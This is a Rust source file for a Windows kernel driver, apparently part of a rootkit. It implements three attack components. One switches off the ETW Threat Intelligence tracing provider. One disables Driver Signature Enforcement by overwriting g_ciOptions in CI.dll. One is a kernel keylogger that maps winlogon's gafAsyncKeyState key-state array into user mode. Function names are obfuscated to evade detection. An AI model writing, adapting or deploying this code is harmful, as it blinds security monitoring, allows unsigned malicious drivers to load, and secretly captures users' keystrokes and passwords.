use core::{ffi::c_void, ptr::null_mut};
use obfstr::obfstr;
use wdk_sys::{
    *, ntddk::*, _MODE::UserMode, 
    _MM_PAGE_PRIORITY::NormalPagePriority,
    _MEMORY_CACHING_TYPE::MmCached
};

use crate::{
    *, 
    error::ShadowError,
    attach::ProcessAttach,
    patterns::{
        scan_for_pattern, 
        ETWTI_PATTERN
    },
    address::{
        get_function_address, 
        get_module_base_address
    },
};

/// Represents ETW (Event Tracing for Windows) in the operating system.
pub struct Etw;

impl Etw {
    /// Enables or disables ETW (Event Tracing for Windows) tracing by modifying the ETWTI structure.
    ///
    /// # Arguments
    ///
    /// * `enable` - A boolean flag indicating whether to enable (`true`) or disable (`false`) ETW tracing.
    ///
    /// # Returns
    ///
    /// * `Ok(NTSTATUS)` - If the operation is successful.
    /// * `Err(ShadowError)` - If any error occurs while finding the function or modifying the ETWTI structure.
    pub unsafe fn etwti_enable_disable(enable: bool) -> Result<NTSTATUS> {
        // Convert function name to Unicode string for lookup
        let mut function_name = uni::str_to_unicode(obfstr!("KeInsertQueueApc")).to_unicode();

        // Get the system routine address for the function
        let function_address = MmGetSystemRoutineAddress(&mut function_name);

        // Scan for the ETWTI structure using a predefined pattern
        let etwi_handle = scan_for_pattern(function_address, &ETWTI_PATTERN, 5, 9, 0x1000)?;

        // Calculate the offset to the TRACE_ENABLE_INFO structure and modify the IsEnabled field
        let trace_info = etwi_handle.offset(0x20).offset(0x60) as *mut TRACE_ENABLE_INFO;
        (*trace_info).IsEnabled = if enable { 0x01 } else { 0x00 };

        Ok(STATUS_SUCCESS)
    }
}

/// Represents Driver Signature Enforcement (DSE) in the operating system.
pub struct Dse;

impl Dse {
    /// Modifies the Driver Signature Enforcement (DSE) state.
    ///
    /// # Arguments
    ///
    /// * `enable` - A boolean flag indicating whether to enable (`true`) or disable (`false`) driver signature enforcement.
    ///
    /// # Returns
    ///
    /// * `Ok(NTSTATUS)` - If the operation is successful.
    /// * `Err(ShadowError)` - If the function fails to find or modify the DSE state.
    pub unsafe fn set_dse_state(enable: bool) -> Result<NTSTATUS> {
        // Get the base address of the CI.dll module, where the relevant function resides
        let module_address = get_module_base_address(obfstr!("CI.dll"))?;

        // Get the address of the CiInitialize function within CI.dll
        let function_address = get_function_address(obfstr!("CiInitialize"), module_address)?;

        // Search for the memory pattern that represents the initialization of DSE
        let instructions = [0x8B, 0xCD];
        let c_ip_initialize = scan_for_pattern(function_address, &instructions, 3, 7, 0x89)?;

        // Locate the g_ciOptions structure based on a pattern in the CiInitialize function
        let instructions = [0x49, 0x8b, 0xE9];
        let g_ci_options = scan_for_pattern(c_ip_initialize.cast(), &instructions, 5, 9, 0x21)?;

        // Modify g_ciOptions to either enable or disable DSE based on the input flag
        if enable {
            *(g_ci_options as *mut u64) = 0x0006_u64;
        } else {
            *(g_ci_options as *mut u64) = 0x000E_u64;
        }

        Ok(STATUS_SUCCESS)
    }
}

/// Represents keylogger operations in the system.
pub struct Keylogger;

impl Keylogger {
    /// Retrieves the address of the `gafAsyncKeyState` array in the `winlogon.exe` process and maps it to user-mode.
    ///
    /// # Returns
    ///
    /// * `Ok(*mut c_void)` - If successful, returns a pointer to the mapped user-mode address of `gafAsyncKeyState`.
    /// * `Err(ShadowError)` - If any error occurs while finding the address or mapping memory.
    pub unsafe fn get_user_address_keylogger() -> Result<*mut c_void> {
        // Get the PID of winlogon.exe.
        log::info!("Retrieving PID for winlogon.exe");
        let pid = get_process_by_name(obfstr!("winlogon.exe"))?;
        log::info!("winlogon.exe PID: {}", pid);
    
        // Attach to the winlogon.exe process.
        log::info!("Attaching to winlogon.exe process (PID: {})", pid);
        let winlogon_process = Process::new(pid)?;
        let _attach_process = ProcessAttach::new(winlogon_process.e_process);
        log::info!("Attached to winlogon.exe at EPROCESS: {:p}", winlogon_process.e_process);
    
        // Retrieve the address of gafAsyncKeyState.
        log::info!("Resolving address for gafAsyncKeyState");
        let gaf_async_key_state_address = Self::get_gafasynckeystate_address()?;
        log::info!("gafAsyncKeyState address: {:p}", gaf_async_key_state_address);
    
        // Allocate an MDL (Memory Descriptor List) to manage the memory.
        log::info!("Allocating MDL for 64 bytes at gafAsyncKeyState address");
        let mdl = IoAllocateMdl(
            gaf_async_key_state_address.cast(),
            core::mem::size_of::<[u8; 64]>() as u32,
            0,
            0,
            core::ptr::null_mut(),
        );
        if mdl.is_null() {
            log::error!("IoAllocateMdl failed for address: {:p}", gaf_async_key_state_address);
            return Err(ShadowError::FunctionExecutionFailed("IoAllocateMdl", line!()));
        }
        log::info!("MDL allocated at address: {:p}", mdl);
    
        // Build the MDL for the non-paged pool.
        log::info!("Building MDL for non-paged pool");
        MmBuildMdlForNonPagedPool(mdl);
    
        // Map the locked pages into user-mode address space.
        log::info!("Mapping locked pages into user-mode address space");
        let address = MmMapLockedPagesSpecifyCache(
            mdl,
            UserMode as i8,
            MmCached,
            core::ptr::null_mut(),
            0,
            NormalPagePriority as u32,
        );
        if address.is_null() {
            log::error!("MmMapLockedPagesSpecifyCache failed for MDL: {:p}", mdl);
            IoFreeMdl(mdl);
            return Err(ShadowError::FunctionExecutionFailed("MmMapLockedPagesSpecifyCache", line!()));
        }
        log::info!("Mapped user-mode address: {:p}", address);
    
        Ok(address)
    }
    

    /// Retrieves the address of the `gafAsyncKeyState` array.
    ///
    /// # Returns
    ///
    /// * `Ok(*mut u8)` - Returns a pointer to the `gafAsyncKeyState` array if found.
    /// * `Err(ShadowError)` - If the array is not found or an error occurs during the search.
    unsafe fn get_gafasynckeystate_address() -> Result<*mut u8> {
        // Get the base address of win32kbase.sys
        let module_address = get_module_base_address(obfstr!("win32kbase.sys"))?;
        log::info!("win32kbase.sys base address: {:p}", module_address);
        // Get the address of the NtUserGetAsyncKeyState function
        let function_address = get_function_address(obfstr!("NtUserGetAsyncKeyState"), module_address)?;
        log::info!("NtUserGetAsyncKeyState address: {:p}", function_address);
        // Search for the pattern that identifies the gafAsyncKeyState array
        // fffff4e1`18e41bae 48 8b 05 0b 4d 20 00  mov rax,qword ptr [win32kbase!gafAsyncKeyState (fffff4e1`190468c0)]
        let pattern = [0x48, 0x8B, 0x05, 0x0B, 0x4D, 0x20, 0x00];
        scan_for_pattern(function_address, &pattern, pattern.len(), pattern.len().try_into().unwrap(), 0x800)
    }
}
